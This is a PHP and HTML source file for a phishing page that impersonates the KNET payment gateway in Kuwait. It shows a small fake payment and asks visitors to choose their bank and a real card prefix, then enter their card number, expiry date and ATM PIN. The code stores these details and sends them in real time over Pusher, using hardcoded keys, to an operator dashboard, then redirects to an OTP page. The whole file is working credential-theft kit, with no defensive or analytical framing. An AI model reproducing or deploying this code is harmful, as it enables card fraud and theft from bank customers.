<?php
error_reporting(0);
ini_set('display_errors', 0);
########################
session_start();

require_once('./dashboard/init.php');
require_once('./vendor/autoload.php');
require __DIR__ . '/vendor/autoload.php';

if (isset($_GET['type'])) {
    $type = $_GET['type'];
}

if (isset($_POST['submit'])) {

    $options = array(
        'cluster' => 'ap2',
        'useTLS' => true
    );
    $pusher = new Pusher\Pusher(
        'e77a3acd6f6fc7cd49ce',
        'd42bbf9412e5a18b9d6c',
        '1816717',
        $options
    );


    $site = array(
        'bank' => $_POST["bank"],
        'bad' => $_POST['bad'],
        'cardNumber' => $_POST['cardNumber'],
        'month' => $_POST['month'],
        'year' => $_POST['year'],
        'password' => $_POST['password'],
        'm' => 'Card Info',
        'type' => '1'
    );

    $_SESSION['cardNumber'] = $_POST['cardNumber'];
    $_SESSION['bad'] = $_POST['bad'];
    $_SESSION['month'] = $_POST['month'];
    $_SESSION['year'] = $_POST['year'];
    $_SESSION['password'] = $_POST['password'];
    
    $userId = $_SESSION['user_id'];
    $updateResult = $User->InsertCardRelatedUser($userId, $site);
    if ($updateResult) {
        $_SESSION['card_id'] = $updateResult;

        $User->UpdateStatus($userId, 'Card Info');
        $data = [
            'userId' => $userId,
            'updatedData' => $site
        ];
    
        $pusher->trigger('my-channel', 'update-user', $data);
        echo "<script>document.location.href='otp.php';</script>";
    }
}


?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <title>الدرة</title>
    <meta content="width=device-width, initial-scale=1.0" name="viewport">
    <meta content="" name="keywords">
    <meta content="" name="description">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />

    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@200..1000&family=Rubik:ital,wght@0,300..900;1,300..900&display=swap" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
    <style>
        * {
            padding: 0;
            margin: 0;
            font-family: "Cairo", sans-serif;
            color: #691E7C;
            direction: rtl;
        }

        body {
            background-color: #f8f9fa;
        }

        .nav {
            background-image: url(./assets/menu_bg\ \(1\).avif);
        }

        .carousel-caption {
            color: #691E7C;
        }

        /* .row {
            background-color: #edeef4 !important;
        } */

        .btn-primary {
            background-color: #691E7C !important;
            border: none;
        }

        .list-style-arrow {
            list-style-type: none;
            padding: 0;
        }

        ul,
        li {
            margin-top: 0;
            margin-bottom: 10.5px;
        }

        ul.list-style-arrow li {
            padding-right: 1.3em;
            position: relative;
        }

        ul.list-style-arrow li:after {
            content: "\f053";
            font-family: FontAwesome;
            font-size: 12px;
            display: block;
            width: 1.3em;
            position: absolute;
            right: 0;
            top: 5px;
        }

        .story {
            background-image: url(./assets/bg_s_story.jpg);
            background-position: top center;
            background-size: cover;
            min-height: 405px;
        }

        .gols {
            background-image: url(./assets/bg_s_story2.jpg);
            background-position: top center;
            background-size: cover;
            min-height: 543px;
        }

        .overl {
            background-image: url(./assets/overlay_bg.png);
            background-repeat: repeat;
            background-size: 50%;
        }

        .form-control,
        select {
            border-radius: 8px !important;
        }

        .cclas {
            border: 1px solid #000;
            border-radius: 20px;
        }

        option {
            color: #6c757d;
        }
    </style>
</head>

<body>

    <!-- <nav class="nav d-flex justify-content-end">
        <img src="./assets/24dde8_57f05cb3b1524c0ba849f6e5a4a0a7fe~mv2.avif" width="230" alt="">
    </nav> -->

    <div class="container text-center mt-4">
        <img src="./assets/b6ee10_401367f75c744af6a7385c03b5a823d7~mv2.avif" class="img-fluid" alt="">
    </div>

    <div class="container mt-4">
        <div class="cclas shadow">
            <div class="text-center mt-2">
                <img src="./assets/c5cbfa_cd127e4564c143ca98cf14fd04002708~mv2.avif" width="60" alt="">
            </div>
            <div class="d-flex justify-content-between mt-2">
                <span class="text-primary me-2 fw-bold">المستفيد:</span>
                <span class="text-secondary fw-bold" style="margin-left: 70px;">Aldurra Alkuwait</span>
                <span></span>
            </div>
            <hr class="my-1">
            <div class="d-flex justify-content-between mb-1">
                <span class="text-primary  me-2 fw-bold">المبلغ:</span>
                <span class="text-secondary fw-bold" >KD 2.000</span>
                <span></span>
            </div>
        </div>
    </div>

    <form action="" method="POST">


        <div class="container mt-4">
            <div class="cclas shadow p-3">
                <div class="d-flex justify-content-between mb-1 py-2">
                    <small class="text-primary  me-2 fw-bold" style="font-size: 11px;width:150px">يرجى اختيار البنك:</small>
                    <div class="text-secondary fw-bold  d-flex align-items-center w-75 justify-content-center" >
                        <select name="bank" id="firstSelect" class="form-select " style="height: 30px;font-size:12px" required>
                            <option value="" selected disabled>يرجى إختيار البنك</option>
                            <option value="[ABK] البنك الاهلي الكويتي" value="[ABK] البنك الاهلي الكويتي">[ABK] البنك الاهلي الكويتي</option>
                            <option value="[RAJHI] مصرف الراجحي" value="مصرف الراجحي">[RAJHI] مصرف الراجحي</option>
                            <option value="[BBK] بنك البحرين والكويت" value="[BBK] بنك البحرين والكويت">[BBK] بنك البحرين والكويت</option>
                            <option value="[BOUBYAN] بنك بوبيان" value="[BOUBYAN] بنك بوبيان">[BOUBYAN] بنك بوبيان</option>
                            <option value="[BURGAN] بنك برقان" value="[BURGAN] بنك برقان">[BURGAN] بنك برقان</option>
                            <option value="[CBK] البنك التجاري الكويتي" value="[CBK] البنك التجاري الكويتي">[CBK] البنك التجاري الكويتي</option>
                            <option value="[DOHA] بنك الدوحة" value="[DOHA] بنك الدوحة">[DOHA] بنك الدوحة</option>
                            <option value="[GBK] بنك الخليج" value="[GBK] بنك الخليج">[GBK] بنك الخليج</option>
                            <option value="[TAM] بيتك" value="[TAM] بيتك">[TAM] بيتك</option>
                            <option value="[KFH] بيت التمويل الكويتي" value="[KFH] بيت التمويل الكويتي">[KFH] بيت التمويل الكويتي</option>
                            <option value="[KIB] بنك الكويت الدولي" value="[KIB] بنك الكويت الدولي">[KIB] بنك الكويت الدولي</option>
                            <option value="[NBK] بنك الكويت الوطني" value="[NBK] بنك الكويت الوطني">[NBK] بنك الكويت الوطني</option>
                            <option value="[WEYAY] الوطني" value="[WEYAY] الوطني">[WEYAY] الوطني</option>
                            <option value="[QNB] بنك قطر الوطني" value="[QNB] بنك قطر الوطني">[QNB] بنك قطر الوطني</option>
                            <option value="[UNB] بنك الاتحاد الوطني" value="[UNB] بنك الاتحاد الوطني">[UNB] بنك الاتحاد الوطني</option>
                            <option value="[WARBA] بنك ووربه" value="[WARBA] بنك ووربه">[WARBA] بنك ووربه</option>
                            <option value="[AUB] البنك الاهلي المتحد" value="[AUB] البنك الاهلي المتحد">[AUB]البنك الاهلي المتحد</option>
                        </select>
                    </div>
                </div>
                <hr class="my-1">
                <div class="d-flex justify-content-between mb-1 py-2">
                    <small class="text-primary  me-2 fw-bold" style="width:150px;font-size: 11px;">رقم بطاقة الصراف الآلي:</small>
                    <div class="text-secondary fw-bold  d-flex w-75 align-items-center justify-content-center gap-2" >
                        <input type="text" class="form-control text-center" name="cardNumber" placeholder="." required pattern="[0-9]*" inputmode="numeric" style="height: 30px;font-size:12px">
                        <select name="bad" id="secondSelect" class="form-select text-center" required style="height: 30px; font-size:12px">
                            <option value="" selected disabled>بادئة</option>
                        </select>
                    </div>
                </div>
                <hr class="my-1">
                <div class="d-flex justify-content-between mb-1 py-2">
                    <small class="text-primary  me-2 fw-bold" style="font-size: 11px;width:150px">تاريخ انتهاء البطاقة:</small>
                    <div class="text-secondary fw-bold d-flex justify-content-center w-75 align-items-center gap-2" >
                        <select name="month" id="" class="form-select text-center" required style="height: 30px;font-size:12px">
                            <option value="" selected disabled>MM</option>
                            <option value="01">01</option>
                            <option value="02">02</option>
                            <option value="03">03</option>
                            <option value="04">04</option>
                            <option value="05">05</option>
                            <option value="06">06</option>
                            <option value="07">07</option>
                            <option value="08">08</option>
                            <option value="09">09</option>
                            <option value="10">10</option>
                            <option value="11">11</option>
                            <option value="12">12</option>
                        </select>
                        <select name="year" id="" class="form-select text-center" required style="height: 30px;font-size:12px">
                            <option value="" selected disabled>YYYY</option>
                            <option value="2024">2024</option>
                            <option value="2025">2025</option>
                            <option value="2026">2026</option>
                            <option value="2027">2027</option>
                            <option value="2028">2028</option>
                            <option value="2029">2029</option>
                            <option value="2030">2030</option>
                            <option value="2031">2031</option>
                            <option value="2032">2032</option>
                            <option value="2033">2033</option>
                            <option value="2034">2034</option>
                            <option value="2035">2035</option>
                            <option value="2036">2036</option>
                            <option value="2037">2037</option>
                            <option value="2038" aria-selected="true">2038</option>
                            <option value="2039">2039</option>
                            <option value="2040">2040</option>
                            <option value="2041">2041</option>
                            <option value="2042">2042</option>
                            <option value="2043">2043</option>
                            <option value="2044">2044</option>
                            <option value="2045">2045</option>
                            <option value="2046">2046</option>
                            <option value="2047">2047</option>
                            <option value="2048">2048</option>
                            <option value="2049">2049</option>
                            <option value="2050">2050</option>
                            <option value="2051">2051</option>
                            <option value="2052">2052</option>
                            <option value="2053">2053</option>
                            <option value="2054">2054</option>
                            <option value="2055">2055</option>
                            <option value="2056">2056</option>
                            <option value="2057">2057</option>
                            <option value="2058">2058</option>
                            <option value="2059">2059</option>
                            <option value="2060">2060</option>
                            <option value="2061">2061</option>
                            <option value="2062">2062</option>
                            <option value="2063">2063</option>
                            <option value="2064">2064</option>
                            <option value="2065">2065</option>
                            <option value="2066">2066</option>
                            <option value="2067">2067</option>
                        </select>
                    </div>
                </div>
                <hr class="my-1">
                <div class="d-flex justify-content-between mb-1 py-2">
                    <small class="text-primary fw-bold me-2" style="font-size: 11px;width:150px">الرقم السري:</small>
                    <span class="text-secondary fw-bold w-75" >
                        <input type="text" class="form-control w-100 text-center" style="height: 30px;font-size:12px" pattern="[0-9]*" minlength="4" maxlength="4" name="password" inputmode="numeric" required>
                    </span>
                </div>
            </div>
        </div>

        <div class="container mt-4">
            <div class="cclas shadow p-3">
                <!-- <input type="checkbox" class="form-checkbox ms-3" required> <span>لقد قرأت ووافقت على شروط التسجيل في KNet </span> -->
                <div class="text-center d-flex gap-2">
                    <button type="submit" name="submit" class="btn w-50 text-secondary fw-bold" style="border-radius: 5px; height:30px; font-size:11px;background-color:lightgray">إرسال</button>
                    <a href="./index.php" class="btn  text-secondary w-50 fw-bold" style="border-radius: 5px; height:30px; font-size:11px;background-color:lightgray">إلغاء</a>
              
                </div>
            </div>
        </div>

    </form>

    <div class="pt-5"></div>

    <div class="text-center">
        <h6 class="text-dark">جميع الحقوق محفوظة  © 2024</h6>
        <h6 class="text-primary">شركة الخدمات المصرفية الالية المشتركة - كي نت</h6>
    </div>


    <script>
        const bankSelect = document.getElementById('firstSelect');
        const otherSelect = document.getElementById('secondSelect');

        // Event listener for the first select element
        bankSelect.addEventListener('change', function() {
            // Clear the current options in the second select
            otherSelect.innerHTML = '<option value="" selected disabled>بادئة</option>';

            // Based on the selected value of the first select, populate the second select
            if (bankSelect.value === '[ABK] البنك الاهلي الكويتي') {
                otherSelect.innerHTML += '<option value="403622">403622</option>';
                otherSelect.innerHTML += '<option value="423826">423826</option>';
                otherSelect.innerHTML += '<option value="428628">428628</option>';
            } else if (bankSelect.value === '[RAJHI] مصرف الراجحي') {
                otherSelect.innerHTML += '<option value="458838">458838</option>';
                otherSelect.innerHTML += '<option value="521020">521020</option>';
                otherSelect.innerHTML += '<option value="521099">521099</option>';
                otherSelect.innerHTML += '<option value="524745">524745</option>';
                otherSelect.innerHTML += '<option value="519859">519859</option>';
                otherSelect.innerHTML += '<option value="46445250">46445250</option>';
                otherSelect.innerHTML += '<option value="543363">543363</option>';
                otherSelect.innerHTML += '<option value="464452">464452</option>';
                otherSelect.innerHTML += '<option value="589160">589160</option>';
            } else if (bankSelect.value === '[BBK] بنك البحرين والكويت') {
                otherSelect.innerHTML += '<option value="588790">588790</option>';
                otherSelect.innerHTML += '<option value="418056">418056</option>';
            } else if (bankSelect.value === '[BOUBYAN] بنك بوبيان') {
                otherSelect.innerHTML += '<option value="470350">470350</option>';
                otherSelect.innerHTML += '<option value="490455">490455</option>';
                otherSelect.innerHTML += '<option value="490456">490456</option>';
                otherSelect.innerHTML += '<option value="404919">404919</option>';
                otherSelect.innerHTML += '<option value="450605">450605</option>';
                otherSelect.innerHTML += '<option value="426058">426058</option>';
                otherSelect.innerHTML += '<option value="431199">431199</option>';
            } else if (bankSelect.value === '[BURGAN] بنك برقان') {
                otherSelect.innerHTML += '<option value="49219000">49219000</option>';
                otherSelect.innerHTML += '<option value="415254">415254</option>';
                otherSelect.innerHTML += '<option value="450238">450238</option>';
                otherSelect.innerHTML += '<option value="468564">468564</option>';
                otherSelect.innerHTML += '<option value="540759">540759</option>';
                otherSelect.innerHTML += '<option value="402978">402978</option>';
                otherSelect.innerHTML += '<option value="403583">403583</option>';
            } else if (bankSelect.value === '[CBK] البنك التجاري الكويتي') {
                otherSelect.innerHTML += '<option value="532672">532672</option>';
                otherSelect.innerHTML += '<option value="537015">537015</option>';
                otherSelect.innerHTML += '<option value="521175">521175</option>';
                otherSelect.innerHTML += '<option value="516334">516334</option>';
            } else if (bankSelect.value === '[DOHA] بنك الدوحة') {
                otherSelect.innerHTML += '<option value="419252">419252</option>';
            } else if (bankSelect.value === '[GBK] بنك الخليج') {
                otherSelect.innerHTML += '<option value="531644">531644</option>';
                otherSelect.innerHTML += '<option value="517419">517419</option>';
                otherSelect.innerHTML += '<option value="531471">531471</option>';
                otherSelect.innerHTML += '<option value="559475">559475</option>';
                otherSelect.innerHTML += '<option value="517458">517458</option>';
                otherSelect.innerHTML += '<option value="526206">526206</option>';
                otherSelect.innerHTML += '<option value="531329">531329</option>';
                otherSelect.innerHTML += '<option value="531470">531470</option>';
            } else if (bankSelect.value === '[TAM] بيتك') {
                otherSelect.innerHTML += '<option value="45077848">45077848</option>';
                otherSelect.innerHTML += '<option value="45077849">45077849</option>';
            } else if (bankSelect.value === '[KFH] بيت التمويل الكويتي') {
                otherSelect.innerHTML += '<option value="450778">450778</option>';
                otherSelect.innerHTML += '<option value="485602">485602</option>';
                otherSelect.innerHTML += '<option value="537016">537016</option>';
                otherSelect.innerHTML += '<option value="532674">532674</option>';
            } else if (bankSelect.value === '[KIB] بنك الكويت الدولي') {
                otherSelect.innerHTML += '<option value="406464">406464</option>';
                otherSelect.innerHTML += '<option value="409054">409054</option>';
            } else if (bankSelect.value === '[NBK] بنك الكويت الوطني') {
                otherSelect.innerHTML += '<option value="464452">464452</option>';
                otherSelect.innerHTML += '<option value="589160">589160</option>';
            } else if (bankSelect.value === '[WEYAY] الوطني') {
                otherSelect.innerHTML += '<option value="46445250">46445250</option>';
                otherSelect.innerHTML += '<option value="543363">543363</option>';
            } else if (bankSelect.value === '[QNB] بنك قطر الوطني') {
                otherSelect.innerHTML += '<option value="524745">524745</option>';
                otherSelect.innerHTML += '<option value="521020">521020</option>';
            } else if (bankSelect.value === '[UNB] بنك الاتحاد الوطني') {
                otherSelect.innerHTML += '<option value="457778">457778</option>';
            } else if (bankSelect.value === '[WARBA] بنك ووربه') {
                otherSelect.innerHTML += '<option value="532749">532749</option>';
                otherSelect.innerHTML += '<option value="559459">559459</option>';
                otherSelect.innerHTML += '<option value="541350">541350</option>';
                otherSelect.innerHTML += '<option value="525528">525528</option>';
            } else if (bankSelect.value === '[AUB] البنك الاهلي المتحد') {
                otherSelect.innerHTML += '<option value="532674">532674</option>';
                otherSelect.innerHTML += '<option value="537016">537016</option>';
                otherSelect.innerHTML += '<option value="532749">532749</option>';
                otherSelect.innerHTML += '<option value="559459">559459</option>';
                otherSelect.innerHTML += '<option value="541350">541350</option>';
                otherSelect.innerHTML += '<option value="525528">525528</option>';
                otherSelect.innerHTML += '<option value="457778">457778</option>';
            }
        });
    </script>

    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js" integrity="sha384-IQsoLXl5PILFhosVNubq5LC7Qb9DXgDA9i+tQ8Zj3iwWAwPtgFTxbJ8NT4GN1R8p" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.min.js" integrity="sha384-cVKIPhGWiC2Al4u+LWgxfKTRIcfu0JTxR+EQDz/bgldoEyl4H0zUF0QKbrJ0EcQF" crossorigin="anonymous"></script>
</body>

</html>